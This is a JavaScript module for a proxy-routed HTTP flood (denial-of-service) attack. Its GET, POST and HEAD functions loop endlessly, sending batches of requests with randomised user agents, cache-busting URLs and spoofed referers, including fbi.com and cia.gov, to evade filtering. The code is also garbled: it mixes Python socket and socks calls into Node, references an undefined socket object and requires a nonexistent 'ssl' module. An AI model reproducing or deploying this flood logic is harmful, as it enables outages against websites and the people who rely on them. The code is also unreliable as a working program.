const socks = require('socks');
const fs = require('fs');
const nodePath = require('path'); 
const { randomInt, randomBytes } = require('crypto');
const ssl = require('ssl');

let target = "";
let urlPath = "/"; 
let port = 80;
let protocol = "http";
let proxies = [];
let mode = "cc";
let proxy_ver = "5";
let brute = false;
let thread_num = 800;
let data = "";
let cookies = "";

const acceptall = [
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
  "Accept-Encoding: gzip, deflate\r\n",
  "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
  "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
  "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
  "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
  "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
  "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,",
  "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
  "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
  "Accept: text/html, application/xhtml+xml",
  "Accept-Language: en-US,en;q=0.5\r\n",
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
  "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
];

const referers = [
  "https://www.google.com/search?q=",
  "https://check-host.net/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://www.fbi.com/",
  "https://www.bing.com/search?q=",
  "https://r.search.yahoo.com/",
  "https://www.cia.gov/index.html",
  "https://vk.com/profile.php?redirect=",
  "https://www.usatoday.com/search/results?q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://steamcommunity.com/market/search?q=",
  "https://www.ted.com/search?q=",
  "https://play.google.com/store/search?q=",
  "https://www.qwant.com/search?q=",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.am/search?q=",
  "https://www.google.co.ao/search?q=",
];

function getuseragent() {
  const platform = ['Macintosh', 'Windows', 'X11'][randomInt(0, 2)];
  let os = '';
  if (platform === 'Macintosh') {
    os = ['68K', 'PPC', 'Intel Mac OS X'][randomInt(0, 2)];
  } else if (platform === 'Windows') {
    os = ['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'][randomInt(0, 14)];
  } else if (platform === 'X11') {
    os = ['Linux i686', 'Linux x86_64'][randomInt(0, 1)];
  }
  const browser = ['chrome', 'firefox', 'ie'][randomInt(0, 2)];
  if (browser === 'chrome') {
    const webkit = randomInt(500, 599).toString();
    const version = `${randomInt(0, 99)}.0${randomInt(0, 9999)}.${randomInt(0, 999)}`;
    return `Mozilla/5.0 (${os}) AppleWebKit/${webkit}.0 (KHTML, like Gecko) Chrome/${version} Safari/${webkit}`;
  } else if (browser === 'firefox') {
    const year = randomInt(2020, new Date().getFullYear()).toString();
    const month = randomInt(1, 12).toString().padStart(2, '0');
    const day = randomInt(1, 30).toString().padStart(2, '0');
    const gecko = `${year}${month}${day}`;
    const version = `${randomInt(1, 72)}.0`;
    return `Mozilla/5.0 (${os}; rv:${version}) Gecko/${gecko} Firefox/${version}`;
  } else if (browser === 'ie') {
    const version = `${randomInt(1, 99)}.0`;
    const engine = `${randomInt(1, 99)}.0`;
    const token = ['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64'][randomInt(0, 5)];
    return `Mozilla/5.0 (compatible; MSIE ${version}; ${os}; ${token}; Trident/${engine})`;
  }
}

function randomurl() {
  return randomInt(0, 271400281257).toString();
}

function GenReqHeader(method) {
  let header = "";
  if (method === "get" || method === "head") {
    const connection = "Connection: Keep-Alive\r\n";
    const accept = acceptall[randomInt(0, acceptall.length - 1)];
    const referer = `Referer: ${referers[randomInt(0, referers.length - 1)]}${target}${urlPath}\r\n`;
    const useragent = `User-Agent: ${getuseragent()}\r\n`;
    header = referer + useragent + accept + connection + "\r\n";
  } else if (method === "post") {
    const post_host = `POST ${urlPath} HTTP/1.1\r\nHost: ${target}\r\n`;
    const content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n";
    const refer = `Referer: http://${target}${urlPath}\r\n`;
    const user_agent = `User-Agent: ${getuseragent()}\r\n`;
    const accept = acceptall[randomInt(0, acceptall.length - 1)];
    if (data === "") data = randomBytes(16).toString('hex');
    const length = `Content-Length: ${data.length} \r\nConnection: Keep-Alive\r\n`;
    header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n";
  }
  return header;
}

function ParseUrl(original_url) {
  original_url = original_url.trim();
  let url = "";
  if (original_url.startsWith("http://")) {
    url = original_url.slice(7);
    protocol = "http";
  } else if (original_url.startsWith("https://")) {
    url = original_url.slice(8);
    protocol = "https";
  } else {
    console.log("Invalid URL");
    process.exit(1);
  }
  const tmp = url.split("/");
  const website = tmp[0];
  const check = website.split(":");
  if (check.length > 1) {
    port = parseInt(check[1]);
  } else {
    port = protocol === "https" ? 443 : 80;
  }
  target = check[0];
  if (tmp.length > 1) {
    urlPath = url.replace(website, "", 1); 
  }
}

function cc(event, proxy_type) {
  const header = GenReqHeader("get");
  
  if (proxies.length === 0) {
    console.error("No proxies available");
    return;
  }

  const proxy = proxies[randomInt(0, proxies.length - 1)].split(":");
  const add = urlPath.includes("?") ? "&" : "?";
  event.wait();

  while (true) {
    let s = null;
    try {
      s = socks.socksocket();
      if (proxy_type === 4) s.set_proxy(socks.SOCKS4, proxy[0], parseInt(proxy[1]));
      if (proxy_type === 5) s.set_proxy(socks.SOCKS5, proxy[0], parseInt(proxy[1]));
      if (proxy_type === 0) s.set_proxy(socks.HTTP, proxy[0], parseInt(proxy[1]));
      if (brute) s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1);
      s.connect(target, port);

      if (protocol === "https") {
        const ctx = ssl.createSecureContext();
        s = ctx.wrap_socket(s, { serverHostname: target });
      }

      for (let i = 0; i < 100; i++) {
        const get_host = `GET ${urlPath}${add}${randomurl()} HTTP/1.1\r\nHost: ${target}\r\n`;
        const request = get_host + header;
        s.send(request);
      }

      s.close();
    } catch (e) {
      if (s) s.close();
    }
  }
}

function post(event, proxy_type) {
  const header = GenReqHeader("post");
  const proxy = proxies[randomInt(0, proxies.length - 1)].split(":");
  event.wait();
  while (true) {
    let s = null;
    try {
      s = socks.socksocket();
      if (proxy_type === 4) s.set_proxy(socks.SOCKS4, proxy[0], parseInt(proxy[1]));
      if (proxy_type === 5) s.set_proxy(socks.SOCKS5, proxy[0], parseInt(proxy[1]));
      if (proxy_type === 0) s.set_proxy(socks.HTTP, proxy[0], parseInt(proxy[1]));
      if (brute) s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1);
      s.connect(target, port);
      if (protocol === "https") {
        const ctx = ssl.createSecureContext();
        s = ctx.wrap_socket(s, { serverHostname: target });
      }
      for (let i = 0; i < 100; i++) {
        s.send(header);
      }
      s.close();
    } catch (e) {
      if (s) s.close();
    }
  }
}

function head(event, proxy_type) {
  const header = GenReqHeader("head");
  const proxy = proxies[randomInt(0, proxies.length - 1)].split(":");
  const add = urlPath.includes("?") ? "&" : "?";
  event.wait();
  while (true) {
    let s = null;
    try {
      s = socks.socksocket();
      if (proxy_type === 4) s.set_proxy(socks.SOCKS4, proxy[0], parseInt(proxy[1]));
      if (proxy_type === 5) s.set_proxy(socks.SOCKS5, proxy[0], parseInt(proxy[1]));
      if (proxy_type === 0) s.set_proxy(socks.HTTP, proxy[0], parseInt(proxy[1]));
      if (brute) s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1);
      s.connect(target, port);
      if (protocol === "https") {
        const ctx = ssl.createSecureContext();
        s = ctx.wrap_socket(s, { serverHostname: target });
      }
      for (let i = 0; i < 100; i++) {
        const head_host = `HEAD ${urlPath}${add}${randomurl()} HTTP/1.1\r\nHost: ${target}\r\n`;
        const request = head_host + header;
        s.send(request);
      }
      s.close();
    } catch (e) {
      if (s) s.close();
    }
  }
}

module.exports = {
  cc,
  post,
  head,
  ParseUrl,
  GenReqHeader,
  getuseragent,
  randomurl,
};
